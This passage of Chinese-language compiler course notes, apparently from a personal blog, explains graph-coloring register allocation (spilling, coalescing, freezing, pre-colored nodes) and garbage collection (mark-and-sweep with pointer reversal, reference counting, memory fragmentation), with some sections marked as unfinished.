class="line">...</span><br><span class="line">// `t` can still be stored in the same register as `s` !</span><br><span class="line">y := ... t ... (use of `t`) </span><br></pre></td></tr></table></figure><p>换言之，此时<code>t</code>只是<code>s</code>的一个别名。<br>……直到<code>t</code>被重定义（非<code>MOVE</code>）时，如果<code>s</code>此时还 live, 才不得不添加 <code>(s, t)</code> 这条边。<br>如果最终<code>s</code>和<code>t</code>在整个分配流程后被证明确实可以使用同一个寄存器，那么这个<strong>自己拷贝到自己的<code>MOVE</code>指令会自然在生成机器码的过程中被我们优化掉</strong>。<br>这对于单静态赋值SSA这种存在大量<code>MOVE</code>的 IR 来说是一个很大的优化。</p><ul><li>这种关系被称为<strong>移动关联(move-related)<strong>，在干扰图中可以用</strong>虚线</strong>表示。</li></ul></li></ul><p>关于如何加边，总结如下 <strong>（有点抽象，可以直接跳过，不会有任何问题）</strong> （请记得每次赋值、每个运算指令都是一种“定义”；<code>out[n]</code>即为 live-out 集合，定义在 CFG 部分，有疑惑可以回顾一下）：</p><ul><li>对于定义了<code>t</code>的<strong>非<code>MOVE</code>指令</strong><code>n</code>，我们有<code>out[n]=&#123;b1, b2, ..., bj&#125;</code>, 则添加边<code>(t, b1)</code>, <code>(t, b2)</code>, …, <code>(t, bj)</code>.</li><li>对于<code>MOVE</code>指令<code>n</code>, 记作<code>t:=s</code>, 有<code>out[n]=&#123;b1, b2, ..., bk&#125;</code>, 则添加上述边<code>(t, b1)</code>, <code>(t, b2)</code>, …, <code>(t, bj)</code>中的一部分。具体而言，如果这些边都记作 <code>(t, bi)</code>, 我们要求<code>bi</code>不是<code>s</code>，也不是某个<code>s</code>的别名.<br>换言之，如果<code>bi</code>是<code>s</code>或是某个<code>s</code>的别名，储存的值和<code>s</code>一样，那么现在就不需要在图上连边 <code>(t, bi)</code>.<br><a name="program-eg-constrained"></a><br>例如：<table><thead><tr><th>Inst.</th><th>Live vars</th><th>Operation</th></tr></thead><tbody><tr><td></td><td>a, b</td><td>link a-b (assume no aliasing)</td></tr><tr><td>t&#x3D;a</td><td></td><td></td></tr><tr><td></td><td>a, b, t</td><td>MOVE: link t-b, but not link t-a</td></tr><tr><td>a&#x3D;a*2</td><td></td><td></td></tr><tr><td></td><td>a, b, t</td><td>link a-b(dup), a-t</td></tr><tr><td>t&#x3D;b</td><td></td><td></td></tr><tr><td></td><td>a, b, t</td><td>MOVE: link t-a(dup),  but not link t-b(though linked)</td></tr><tr><td>return a*t+b</td><td></td><td></td></tr></tbody></table></li></ul></li></ul><h3 id="图染色概述"><a href="#图染色概述" class="headerlink" title="图染色概述"></a>图染色概述</h3><p>vertex coloring: 对所有节点进行染色，且<strong>对于任何边，两个端点节点的颜色都不一样</strong>。<br>k染色(k-coloring): 最多使用 k 种颜色的 vertex coloring.</p><p>著名的四色定理指出：对于任意 <strong>“平面图”</strong> ，至多只需要 4 种颜色即可完成染色，也就是说所有平面图都是 4-colorable 的。<br>——温馨提示：这个定理和我们的课程内容八竿子打不着边。</p><p>在得到干扰图后，我们对其进行k染色。<br>染色完毕后，每一种颜色对应一个物理寄存器，节点颜色即为节点所对应的寄存器。<br>当然也有可能染色失败：这意味着需要超过k种颜色才能染色成功。<br>如果需要的颜色种数超过物理寄存器个数，说明 spilling （部分临时寄存器分配不到物理寄存器，不得不“溢出”到内存上）是必要的。</p><p><strong>任务：</strong> 找到最小的 k, 使得染色可以成功。-&gt; <strong>NP-hard!</strong><br>对应的判定问题：检查图是否 k-colorable. -&gt; <strong>NP-Complete!</strong><br>所以其实并不需要找到“最小”的k，只需要“较小”的结果即可。也就是需要实现一个<strong>近似算法</strong>，以及一些启发式的想法。<br>换句话说，可以容忍找到的k不是最小的，或是误判一个事实上 k-colorable 的图无法被k染色。</p><p>接下来引入一种线性时间的算法，能给出不错的结果。大体分为4个部分：</p><ol><li>Build: 建图（刚刚已经完成了）</li><li>Simplify: 对干扰图进行<strong>简化</strong></li><li>Spill: 处理被挤出的寄存器</li><li>Select&#x2F;Color: 进行节点染色操作</li></ol><p>我们将在下文详细介绍并改进该算法。</p><blockquote><p>请注意：我们提到的“变量”“temporary”“虚拟寄存器”“节点”其实基本上是同一个东西。<br><strong>temporary</strong> 是更广义的变量，包含运算的中间值。IR 里的 temporary <strong>有时也用“变量”称呼</strong>。<br>在 IR 里的这些 temporary 之后要进行寄存器分配。所以现在先假设有无数虚拟的寄存器，每个 temporary 都存在一个<strong>虚拟寄存器</strong>里。<br>而干扰图上的<strong>节点</strong>就代表这些虚拟寄存器。</p></blockquote><h3 id="一个简单的图染色算法"><a href="#一个简单的图染色算法" class="headerlink" title="一个简单的图染色算法"></a>一个简单的图染色算法</h3><p>首先，考虑一个简化版本的、很粗糙的近似算法，用于判断图是否 k-colorable, 并给出染色方案：</p><ol><li>Build: 建图，已经完成了。</li><li>Simplify:<ul><li>如果从图<code>G</code>中存在一个节点<code>n</code>，其度数（i.e. 相邻节点数量）小于k, 令图<code>G&#39;</code>为从<code>G</code>中移除该节点得到的图。<br>那么如果<code>G&#39;</code>是 k-colorable 的，则原来的图<code>G</code>也是。<ul><li>这是显然的：给定一个图<code>G&#39;</code>的k染色方案，由于相邻节点数量不够多，一定有剩余的颜色分配给<code>n</code>.<br>因此把<code>G</code>的k染色问题简化为了<code>G&#39;</code>的k染色问题。</li></ul></li><li>这就引出<strong>一个自然的启发式的算法：</strong><br><strong>不断地从图中删除度数少于k的节点（并放入栈中）</strong>。<br>可以保证，每次删除的这个节点都有剩余的、可用的颜色分配给他。<br>如此重复删除下去，有机会直接把图简化成空图！这样就能直接宣告整个染色过程结束了。</li></ul></li><li>Spill: 暂时留白，什么也不做。</li><li>Select: 接下来要从这个空图重建原图。<strong>每次从栈顶取出一个节点，一定有剩余的、可用的颜色能用于染色。</strong><ul><li>每次简化删除一个节点时，都保证如果删除后颜色够用，那么删除前颜色也够用。</li><li>因此对于每次删除，有删除后的k染色方案，就能推出一个删除前的k染色方案。</li><li>显然，空图是 k-colorable 的。因此如果图被删空了，我们就可以归纳地推出原图的k染色方案。</li><li>显然，删除顺序的逆序&#x3D;归纳推理的顺序&#x3D;算法找到的合法的染色顺序（所以使用的是栈）。</li></ul></li></ol><p><img src="/compiler-construction-principles/coloring-k2.png" alt="coloring-k2" loading="lazy"><br><img src="/compiler-construction-principles/coloring-rebuild-k2.png" alt="coloring-rebuild" loading="lazy"></p><p>这个算法跑的很快（线性），但很容易误伤无辜：毕竟这只是个近似算法。<br>如果一个近似算法 fail 了，这个图事实上可能还是 k-colorable 的，只是这个算法能力不足以找到可行解。<br>对于现在这个简单的算法来说，fail 就意味着在某一步，所有节点的度数都&gt;&#x3D;k（或者说图中的节点度数都是 <strong>significant</strong> 的）.</p><p>此时不得不考虑如何实现刚刚留白的第三步，也就是处理 <strong>spilling</strong>: 也就是选择图中的一些节点，把他们放在内存（而非寄存器）中。</p><h3 id="挤出Spilling"><a href="#挤出Spilling" class="headerlink" title="挤出Spilling"></a>挤出Spilling</h3><p>如果上述算法在某一步无法继续下去，也就是说图中所有节点的度数都&gt;&#x3D;k, 无法继续简化。<br>这就意味着染色失败了吗？其实并不一定：<strong>相邻节点数量少于k一定能染色成功；但这不代表邻居超过k个就一定失败。</strong><br>如果相邻节点重复使用了部分颜色，那么该节点依旧可以使用剩下的。所以可以当作无事发生，继续删除该节点并压入栈中，该算法继续运行。</p><p>这就是 Chaitin-Briggs 提出的<strong>乐观染色(optimistic coloring)</strong>: 如果遇到有 spill 可能的节点（i.e. 度数&gt;&#x3D;k）<code>ns</code>时，先乐观地假设它其实可以被染色成功，不会 spill, 依旧删除并压入栈中，继续该算法。<br>不过这就使得后续的 select 部分需要做出修改：</p><ul><li>染色成功：把<code>ns</code>弹出栈时，邻居使用的颜色种数少于 k, 有剩余的颜色分配给<code>ns</code>. 这说明刚刚作出的乐观假设确实成立，万事大吉<br><img src="/compiler-construction-principles/optimistic-coloring-success-before.png" alt="optimistic-coloring-success-before" loading="lazy"><br><img src="/compiler-construction-principles/optimistic-coloring-success.png" alt="optimistic-coloring-success" loading="lazy"></li><li>染色失败：把<code>ns</code>弹出栈时，邻居已经使用了 k 种颜色, <code>ns</code>无法染色成功。这说明刚刚的乐观假设过度乐观了，需要进行 spill 操作<br><img src="/compiler-construction-principles/optimistic-coloring-failed.png" alt="optimistic-coloring-failed" loading="lazy"><ul><li>此时不为<code>ns</code>染色，也不终止这个算法，而是继续进行 select 直到所有像<code>ns</code>这样无法被染色成功，需要 spill 的节点都找出来。</li></ul></li></ul><p>现在，改进版的染色算法如下：</p><ol><li>Build: 建立干扰图。</li><li>Simplify: 不断执行简化，如果找到可能 spill 的节点（度数&gt;&#x3D;k）则标记，并按照乐观染色策略继续进行，直到简化为空图。最终，我们就标记了许多无法被染色的节点。</li><li>Select: 当 select 算法运行一轮后，我们会发现：<ul><li>这些无法被染色的节点中的一部分确实 spilled, 需要 do actual spills, 也就是改写和这部分变量读写相关的代码，继续执行第4步↓</li><li>不发生 actual spill, 染色成功！算法结束。</li></ul></li><li>Rewrite: 改写代码，将每个 spilled 变量(actual spilled variables)移动到内存上：<ol><li>为 spilled 变量<code>f</code>分配内存地址<code>fa</code>(一般在栈帧上，除非太大或者有什么别的情况)</li><li>引入新的<code>fx</code>系列 temporaries: <code>f1</code> <code>f2</code> … <code>fn</code>, 用于在每次使用&#x2F;定义<code>f</code>时临时储存<code>f</code>的值。这些临时变量的 live range 较短，减少了 interference.</li><li>在所有使用<code>f</code>的指令前加入<code>fx:=load fa</code>（读的时候先从内存载入）。</li><li>在所有定义<code>f</code>的指令后加入<code>store fx, fa</code>（写的时候需要写进内存）。</li></ol></li><li>使用改写后的代码，返回步骤1进行 Rebuild. 由于引入了一系列 temporaries, 需要重建干扰图。在 spilling 后，这个干扰图相比原先的会更简化，更容易被染色成功。</li></ol><p>这个循环一般来说只需要一到两次就能结束。<br>下面来看一个例子，假设有4个物理寄存器（i.e. k&#x3D;4）：<br><img src="/compiler-construction-principles/coloring-k4.png" alt="coloring k4" loading="lazy"><br>图中虚线代表<code>MOVE</code>.</p><p>入栈顺序：g h k d j e f b c m<br>染色：</p><table><thead><tr><th>Node</th><th>Color</th></tr></thead><tbody><tr><td>m</td><td>1</td></tr><tr><td>c</td><td>3</td></tr><tr><td>b</td><td>2</td></tr><tr><td>f</td><td>2</td></tr><tr><td>e</td><td>4</td></tr><tr><td>j</td><td>3</td></tr><tr><td>d</td><td>4</td></tr><tr><td>k</td><td>1</td></tr><tr><td>h</td><td>2</td></tr><tr><td>g</td><td>4</td></tr></tbody></table><p><img src="/compiler-construction-principles/coloring-k4-result.png" alt="coloring-k4-result" loading="lazy"></p><h3 id="合并Coalescing"><a href="#合并Coalescing" class="headerlink" title="合并Coalescing"></a>合并Coalescing</h3><p>现在要进一步改进这个算法：在 simplify 后合并部分节点。</p><p>之前，我们说到对于<code>t:=s</code>这样的<code>MOVE</code>指令需要特殊处理：并不立刻为<code>(t, s)</code>, <code>(t, s1)</code>, <code>(t, s2)</code>…（其中s1, s2, … 代表目前活跃的 s 的别名，保存的值和 s 相同）这些点对添加边。因为此时 t 只是 s 的又一个别名，可以共享一个寄存器。<br>等到某个定义改变了其中一方的值，破坏了这种别名关系时，才真正连边。<br>而如果整个算法运行完毕后，发现<code>MOVE</code>指令对应的这些点对之间确实还没有边，就说明这些节点事实上可以被 <strong>合并(coalesce)</strong> 为同一个节点。<br><img src="/compiler-construction-principles/coalescing.png" alt="coalescing" loading="lazy"></p><ul><li>好处👍：可能使得原图更容易染色，例如合并的这两个节点共用大部分的相邻节点<br><img src="/compiler-construction-principles/coalescing-pros.png" alt="coalescing-pros" loading="lazy"></li><li>坏处👎：可能使得原图无法染色：极端情况下，合并后的节点的度数可能是合并前两个节点度数之和！</li></ul><p>在此引入<strong>保守合并策略</strong>。当某些条件成立时才合并节点<code>a</code>和<code>b</code>.</p><p>有如下的策略可用：</p><ul><li><strong>Briggs</strong>: 确保合并出的新节点<code>ab</code>的相邻节点中，<strong>significant 节点（i.e. 度数&lt;&#x3D;k的节点）</strong> 数量少于 k 个。<ul><li>避免创造新的 significant 节点。</li><li>这样在执行 simplify 时，<code>ab</code>相邻节点中的 non-significant 节点被去掉后，<code>ab</code>自己也成为 non-significant 节点。 因此不会降低可染色性。</li></ul></li><li><strong>George</strong>: 对于<code>a</code>的每个相邻节点<code>t</code>, 要么<code>t</code>是 non-significant 节点，要么<code>t</code>和<code>b</code>之间本来就有 interference 边。<ul><li>non-significant 的邻居会被 simplify 掉。</li><li><code>(a, t)</code>与<code>(b, t)</code>合并得到新边<code>(ab, t)</code>, 不会增加任何节点的度数。</li></ul></li></ul><h3 id="冻结Freeze"><a href="#冻结Freeze" class="headerlink" title="冻结Freeze"></a>冻结Freeze</h3><p>要明确一点：<strong>合并操作是一把双刃剑</strong>。合并的不止是寄存器，还有节点对应 temporaries 的 live range. 新的节点，也就是新的 temporary 能“活更久”，对寄存器分配造成更大压力。如果因此造成了更多 spill, 那么得不偿失：与其进行内存读写，还不如不要自作主张“优化”掉<code>MOVE</code>指令。</p><p>如果 simplify 和 coalesce 都无法进行，我们寻找<code>MOVE</code>指令引入的<strong>低度数</strong>节点（也就是 non-significant 节点），或者说找一些低度数的 move-related 节点。<br>我们将这些节点“冻结”，也就是去除这些节点相关的移动关联(move-related)关系，不再试图让这些节点参与合并。<br>然后就可以再次尝试 simplify 和 coalesce.</p><p>可参阅：<a href="https://www.cnblogs.com/AANA/p/16315859.html">图着色寄存器分配 - anna - 博客园</a></p><h3 id="图染色总结"><a href="#图染色总结" class="headerlink" title="图染色总结"></a>图染色总结</h3><p>引入了一些新东西，因此算法许多部分都有些微调。<br>最终梳理一下我们的算法。包含如下几个模块↓</p><ol><li>Build: 建图<ul><li>建立干扰图</li><li>标记节点是否是移动关联(move-related)节点（i.e. <code>MOVE</code>的源&#x2F;目标）</li></ul></li><li>Simplify: 简化图<ul><li>每次去除一个 non-significant 的<strong>非</strong>移动关联节点</li></ul></li><li>Coalesce: 合并<code>MOVE</code>引入的移动关联节点<ul><li>进行保守合并，得到的新节点标记为<strong>非移动关联节点</strong>，可用于下一次 simplify</li></ul></li><li>Freeze: 冻结部分移动关联节点，放弃合并<ul><li>simplify 和 coalesce 交替进行。如果两者都无法进行，则尝试放弃合并部分 non-significant 移动关联节点。</li><li>放弃合并的节点不再视为 move-related 节点</li></ul></li><li>Spill: 处理需要挤出到内存的变量<ul><li>万策尽：确实存在需要 spill 的 temporaries, 找到所有这样的一起进行 spilling</li><li>Do actual spilling: 改写 IR 代码以把它们移动到内存中，重新开始整个算法。</li></ul></li><li>Select: 不断弹栈，为出栈节点分配可用颜色，直到只剩下<strong>预染色节点</strong>（见下文）。</li></ol><p>全流程：<br><img src="/compiler-construction-principles/coloring-algo-full.png" alt="coloring-algo-full" loading="lazy"><br><img src="/compiler-construction-principles/coloring-algo-full-book.png" alt="coloring-algo-full-book" loading="lazy"></p><p>图中可以看出，simplify 和 coalesce 交替进行直到图为空或无法继续后，再进行 freeze 等操作。</p><p>课件上有一个很好的例子，展示了如何把一个程序在一个 3 个寄存器(2 caller-save + 1 callee-save)的机器上进行编译。<br>有条件的同学建议参阅课件： ch11. 寄存器分配 第124页。</p><h3 id="图染色杂项"><a href="#图染色杂项" class="headerlink" title="图染色杂项"></a>图染色杂项</h3><ul><li><p><strong>预染色(pre-colored)</strong> 节点：</p><ul><li><p>栈顶指针寄存器、参数寄存器等 special purposed 寄存器不是通用的。</p></li><li><p>可以把这些物理寄存器一一对应成虚拟寄存器，或者说为每个 special purposed 寄存器分配一个专属 temporary &#x2F; node.</p></li><li><p>需要通过预先染色，以告诉染色器这种一一对应的关系：</p><ul><li>每个 pre-colored node 的颜色是唯一的</li><li>pre-colored nodes 之间互相两两 interfere （不一定需要真的全连接，也可以特殊处理）</li></ul></li><li><p>预染色节点<strong>不能</strong>被 simplify 掉。</p></li><li><p>预染色节点<strong>不能</strong>被 spill 到内存上。</p></li><li><p>预染色节点<strong>能</strong>参与合并(coalescing).</p></li><li><p>普通的 temporary &#x2F; node 可以使用预染色的颜色（只要不 interfere）</p><ul><li>例如，calling-convention register 可以在函数里当作临时寄存器使用。使用时，这个临时值(temporary)对应的节点颜色即为 calling-convention register 对应的预染色节点的颜色</li></ul></li><li><p>编译器前端需要保证预染色 temporary 的 live range 足够短：多多使用<code>MOVE</code><br>最佳实践：</p><ul><li>temporary 的 live range 如果不需要跨越某个函数调用，<strong>最好</strong>放置在 caller-save 寄存器中</li><li>temporary 的 live range 如果需要跨越某个或多个函数调用，<strong>只能</strong>放置在 callee-save 寄存器中</li></ul></li></ul></li><li><p>受限的(constrained)节点：如果两个节点之间同时有移动关联（虚线边）又有冲突（实线边），那么需要忽略这个移动关联关系。</p><ul><li>某个变量被多次<code>MOVE</code>进不同的值，合并后就会这样。</li><li>例如上文<a href="#program-eg-constrained">这个程序</a>：<br><img src="/compiler-construction-principles/example-constrainted.png" alt="example-constrainted" loading="lazy"><br>如果<code>a</code>和<code>t</code>合并为<code>at</code>, 就不能和<code>b</code>共用寄存器。<br>同理，如果<code>b</code>和<code>t</code>合并为<code>bt</code>, 就不能和<code>a</code>共用寄存器。</li></ul></li><li><p>需要 spilling 时如何选择节点进行 spill 呢？优先选择：</p><ul><li>较少使用的 temporary ：例如在循环外的。</li><li>高度数的节点：它们是“罪魁祸首”，我们应当“擒贼先擒王”。</li></ul></li></ul><h2 id="Part-18-垃圾回收"><a href="#Part-18-垃圾回收" class="headerlink" title="Part 18: 垃圾回收"></a>Part 18: 垃圾回收</h2><h3 id="运行时Runtime"><a href="#运行时Runtime" class="headerlink" title="运行时Runtime"></a>运行时Runtime</h3><p>运行时 &#x3D; Runtime &#x3D; (Language) Runtime System &#x3D; 程序默认的、不在编写时描述的builtin 方法等运行时环境信息。可能有：</p><ul><li>POSIX 信号处理</li><li>任务智能分配到多核 CPU 的不同核心</li><li>虚拟机（比如 JVM）</li><li><strong>智能内存管理</strong><ul><li>比如：<strong>垃圾回收</strong></li></ul></li></ul><h3 id="内存管理概述"><a href="#内存管理概述" class="headerlink" title="内存管理概述"></a>内存管理概述</h3><ul><li><strong>手动内存管理</strong>带来许多安全隐患，是最主要的漏洞来源之一。可能的问题：<ul><li>内存泄漏：不再使用的内存未释放，可用内存越来越少，消耗系统资源。</li><li>Double-free: 重复释放同一块内存。可能导致程序崩溃，或是被攻击者以此误导 glibc 等实现未授权的内存写入。</li><li>Use-After-Free(UAF): 使用已经被释放的内存区域（例如通过悬空指针）。如果在释放后这块区域被攻击者修改了，之后再次使用时可能误导程序做出恶意行为。</li></ul></li><li>内存管理需要平衡性能、安全以及开发难度。</li><li>内存区域划分：<ul><li>Static area<ul><li>编译期分配</li><li>全局变量、字符串字面量等</li></ul></li><li>Runtime stack<ul><li>也就是栈，储存许多栈帧 &#x2F; 活动记录(activation record)</li><li>包含局部变量、函数调用返回地址等信息</li></ul></li><li><strong>堆(heap)</strong><ul><li>通过<code>malloc</code> <code>new</code> 等方式在程序中动态分配的对象</li><li>如果这些对象不再使用则称之为 <strong>垃圾(garbage)</strong></li></ul></li></ul></li><li>垃圾回收(garbage collection, GC)：自动清理不被使用的垃圾。<ul><li>是运行时的一部分。</li><li>在 LISP 里第一个应用。</li><li>两个阶段：<ol><li>garbage detection: 检测已经成为垃圾的内存对象</li><li>garbage reclamation: 释放这些垃圾对象</li></ol></li></ul></li><li>理想的垃圾回收器：<ul><li>安全：不会回收还没成为垃圾的对象 <strong>（必须）</strong></li><li>完善(Complete)：应回收尽回收</li><li>Low overhead: 时空占用小</li><li>Fast: short <strong>pause time(程序为了等待垃圾回收时阻塞的时间)</strong> + 并行化</li><li>实现简单：现在是，幻想时间……</li><li>……</li></ul></li></ul><p>如何判断一块内存<code>M</code>之后是否会被继续使用？考虑程序<code>/* here */ Call P; Use M;</code>:<br>如果能在<code>here</code>处判断<code>M</code>是否会被继续使用，就意味着能判定<code>P</code>是否停机……这是个<strong>不可判定问题！</strong></p><p>因此，我们需要再次使用<strong>保守估计</strong>的策略，只回收那些确信是垃圾的对象，确保垃圾回收器是安全的。<br>我们通过判断内存对象的<strong>可达性(reachability)<strong>来找出哪些对象可以 &#x2F; 无法通过指针，或是指针链访问到。</strong>不可达的对象一定不可用。</strong></p><p>接下来的任务：使用某种方式获取内存对象的可达性信息。方法：</p><ul><li>引用计数Reference Count: 统计每个内存单元被引用的次数<ul><li>直接追踪哪些内存单元是活跃的。</li><li>分配堆上空间时，GC 介入。</li><li>无法检测所有垃圾。</li></ul></li><li>Tracing<ul><li>当分配堆上空间<strong>失败时</strong>，GC 介入并检测活跃的内存单元。</li><li>Mark-sweep</li><li>Copying collection &#x2F; Stop-and-copy</li></ul></li><li>其他现代方法：generational GC 等。</li></ul><p>接下来我们会详细讨论这些方法。</p><h3 id="基础数据结构：有向图"><a href="#基础数据结构：有向图" class="headerlink" title="基础数据结构：有向图"></a>基础数据结构：有向图</h3><p>对象间的引用关系构成一个有向图。</p><ul><li>点：<ul><li><strong>变量&#x2F;寄存器</strong>：在图中是一些指向内存对象的 <strong>“根节点”</strong>。</li><li>内存对象（例如一个 struct &#x2F; record）：被指向，也可能指向其他内存对象。</li></ul></li><li>有向边：指针，<code>a</code>储存了指向<code>b</code>的指针，则对应一条有向边<code>a-&gt;b</code></li></ul><p><img src="/compiler-construction-principles/directed-graph.png" alt="directed-graph" loading="lazy"></p><p>在图上，我们可以更好地描述可达性：</p><ul><li>无法从任一“根节点”<code>r</code>出发，通过一条链<code>r-&gt;a-&gt;b-&gt;c-&gt;...-&gt;x</code>到达的内存对象<code>x</code>，就是不可达的对象。</li><li>例如，如果内存对象<code>x</code>的入度为0, 则<code>x</code>一定不可达（但反之不然）。</li></ul><h3 id="Mark-and-Sweep"><a href="#Mark-and-Sweep" class="headerlink" title="Mark-and-Sweep"></a>Mark-and-Sweep</h3><p>一种朴素的垃圾回收方式。有如下两步：</p><ol><li>Mark: 从各个根节点出发，搜索并标记能到达的全部节点。</li><li>Sweep: 线性扫描整个堆，把未被标记的节点（不可达节点）链接到 <strong>freelist</strong> 中, 最后清除标记。</li></ol><p><img src="/compiler-construction-principles/graph-marks.png" alt="graph-marks" loading="lazy"><br>图中蓝色的节点即为<strong>未</strong>被标记的节点。<br>图中的<code>·</code>即为变量或是 record 中的字段。如有出边，则代表它是个指针，指向一个 record.</p><p><strong>freelist</strong>: 储存所有可用的(free)内存块，<strong>是一个链表</strong>。程序开始运行，没有进行任何堆内存分配时，这个链表自然包含了程序内存中的所有块。</p><p>当程序需要在堆上分配一个 record 时，从 freelist 中取出一块。<br>如果此时 freelist 空了或是不足以满足 record 的空间需求，则重新进行一次 Mark-and-Sweep 尝试找到垃圾并回收入 freelist, 然后再分配.<br>如果找不到任何垃圾回收，或是回收后 freelist 仍空间不足，则分配失败。</p><p>Mark-and-Sweep 方案的代价分析：</p><ul><li>H: 堆的总块数</li><li>R: 可达的数据块数</li><li>时间花费：<ul><li>Mark: 遍历可达对象，代价为 $ c_1 R $.</li><li>Sweep: 遍历整个堆，代价为 $ c_2 H $.</li><li>填充 freelist, 大小变为 H-R:<ul><li>长期来看，分配对象数&#x3D;回收对象数。</li><li>摊还后的代价 &#x3D; 单次代价&#x2F;回收对象数 &#x3D; $ (c_1 R + c_2 H)&#x2F;(H-R) $.</li><li>如果堆一直接近满（H接近R），则时间花费极大！</li></ul></li></ul></li></ul><p>该方案的问题与改进：</p><ul><li>问题：遍历可达对象时如果直接 DFS, 在极端情况下容易递归过深爆栈。<ul><li>解决方法：使用显式的栈(explicit stack)进行 DFS: 手动模拟一个栈，初始时压入所有 roots; 每次弹出栈顶节点<code>t</code>，标记<code>t</code>, 把<code>t</code>指向的所有节点压入栈中；重复执行直到栈空。</li></ul></li><li>问题：即使如此，栈的大小太大了<ul><li>解决方法：<strong>Deutsch-Schorr-Waite (DSW) pointer reversal</strong><ul><li><p>不使用显式的栈，而是复用图中的元素（节点与边），<strong>把栈“放在”图中：在图中用指针串起来一连串节点，也可以充当栈！</strong><br>当搜索某个节点（也就是内存中的一个对象，或者说 record）<code>x</code>时：</p><ol><li>标记<code>x</code>.</li><li>如果发现有<code>x</code>的某个 field <code>x.fi</code> 储存了一个指针，并且指向一个未标记的子节点<code>y</code>：临时篡改<code>x.fi</code>,让它指向<code>x</code>的父节点<code>t</code>: <code>y:=x.fi; x.fi:= t</code>.<br><img src="/compiler-construction-principles/modify-pointer.png" alt="modify-pointer" loading="lazy"></li><li>递归地，搜索、标记子节点<code>y</code>(对应地更新<code>t:= x; x:= y</code>)。</li><li>搜索完毕后，退回父节点(对应地更新<code>y:= x; x:= t; t:= x.fi</code>)，然后恢复这个被临时篡改的指针：<code>x.fi:= y</code>。</li></ol></li><li><p>伪代码如下：<br><img src="/compiler-construction-principles/pointer-reversal.png" alt="pointer-reversal" loading="lazy"></p><ul><li>对所有变量（“根节点”）<code>v</code>执行<code>DFS(v)</code></li><li><code># of ...</code> &#x3D; <code>the number of ...</code></li><li><code>x</code>: 全局指针，指向当前处理的节点</li><li><code>t</code>: 全局指针，指向当前处理节点的“父节点”</li><li><code>y</code>: <code>x</code>的某个子节点</li><li><code>done[r]</code>: 记录<code>r</code>这个 record 中,已被检查&#x2F;搜索过的 fields 是那些。例如若<code>done[r]=3</code>:<ul><li>说明<code>r.f0</code> <code>r.f1</code> <code>r.f2</code>已经被处理过，现在下一个要处理的子节点是 <code>r.f3</code> (如果<code>r.f3</code>是指针)。</li><li>之后，如果<code>r.f3</code>指向子节点，搜索前篡改<code>r.f3</code>为<code>t</code>.</li><li>最后，如果子节点搜索处理完毕回退到<code>r</code>, 程序就可以知道需要恢复的、之前被篡改的 field 就是<code>r.f3</code>.</li></ul></li></ul><p>课件示例拼接：<br><img src="/compiler-construction-principles/pointer-reversal-example.png" alt="pointer-reversal-example" loading="lazy"></p></li></ul></li></ul></li></ul><p>Mark-and-Sweep 总结：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ 垃圾数量较少时很高效</span></span><br><span class="line"><span class="addition">+ 可以回收循环引用（A-&gt;B-&gt;C-&gt;A...）</span></span><br><span class="line"><span class="addition">+ 对象在内存中不需要移动，也就是其位置不需要更改（有时影响程序正确性：参考隔壁 Rust 的 std::pin）</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- 垃圾数量多时很低效</span></span><br><span class="line"><span class="deletion">- GC 过程会阻塞程序运行，程序必须暂停以回收垃圾</span></span><br><span class="line"><span class="deletion">- 容易导致堆的碎片化，尤其是会产生许多内存（外部）碎片</span></span><br></pre></td></tr></table></figure><p>关于 <strong>内存碎片</strong> 这一概念，我们会在该部分的最后进行说明。</p><h3 id="引用计数Reference-Count"><a href="#引用计数Reference-Count" class="headerlink" title="引用计数Reference Count"></a>引用计数Reference Count</h3><p>核心思想：在释放对象时就进行垃圾回收，而不是等到申请内存时发现空间不足才试图回收垃圾。</p><p>尽管不能确定被指针指向的对象是不是垃圾，但是我们能知道的是<strong>没有任何指针指向的对象一定是垃圾</strong>。</p><p>使用引用计数的垃圾回收，简而言之就是：</p><ul><li>维护每个对象<code>x</code>被几个指针引用（指向），这个值记作<code>rc</code>.</li><li>在删除指针时，<code>x</code>的<code>rc:= rc-1;</code>.</li><li>如果此时发现<code>rc</code>变为0了，立刻进行垃圾回收，释放<code>x</code>.<ul><li>如果<code>x</code>也包含指向其他对象的指针，则在释放<code>x</code>前，需要递归地删除指针（意味着可能递归地触发 GC）</li></ul></li></ul><h3 id="Copying-Collection"><a href="#Copying-Collection" class="headerlink" title="Copying Collection"></a>Copying Collection</h3><p>也叫做 <strong>Stop-and-Copy</strong>.</p><p><em>&gt;&gt;&gt;To be continued…</em></p><h3 id="垃圾回收：编译器相关接口-机制"><a href="#垃圾回收：编译器相关接口-机制" class="headerlink" title="垃圾回收：编译器相关接口&#x2F;机制"></a>垃圾回收：编译器相关接口&#x2F;机制</h3><p><em>&gt;&gt;&gt;To be continued…</em></p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><p>内存碎片：意味着浪费了内存中的空间，内存不是“最密堆积”的。<br>有两种内存碎片：</p><ul><li>外部碎片(external fragmentation): 当程序要求分配一块内存时，尽管堆中看起来可用空间足够，但由于这些可用空间零散、碎片化地分布在各个位置，成为了外部碎片，我们找不到足够大的一段连续内存分配给程序，分配失败。<br><img src="/compiler-construction-principles/external-fragment.png" alt="external-fragment" loading="lazy"></li><li>内部碎片(internal fragmentation): 当程序要求分配一块内存时，由于地址对齐等原因，内存管理管理器可能返回一块比要求的更大的内存，用不完的部分即为内部碎片，将不可避免地被浪费。<br><img src="/compiler-construction-principles/internal-fragment.png" alt="internal-fragment" loading="lazy"></li></ul></li><li><p>内存分配方式：</p><ul><li>Linear allocation: <img src="/compiler-construction-principles/linear-alloc.png" alt="linear" loading="lazy"></li><li>Freelist allocation: <img src="/compiler-construction-principles/freelist-alloc.png" alt="freelist" loading="lazy"></li></ul></li></ul><h2 id="Part-19-面向对象-OOP"><a href="#Part-19-面向对象-OOP" class="headerlink" title="Part 19: 面向对象(OOP)"></a>Part 19: 面向对象(OOP)</h2><p><em>&gt;&gt;&gt;To be continued…</em></p><h2 id="Part-20-循环优化"><a href="#Part-20-循环优化" class="headerlink" title="Part 20: 循环优化"></a>Part 20: 循环优化</h2>]]></content>
      
      
      <categories>
          
          <category> Course Notes </category>
          
          <category> Compiler Construction Principles </category>
          
      </categories>
      
      
        <tags>
            
            <tag> On Going </tag>
            
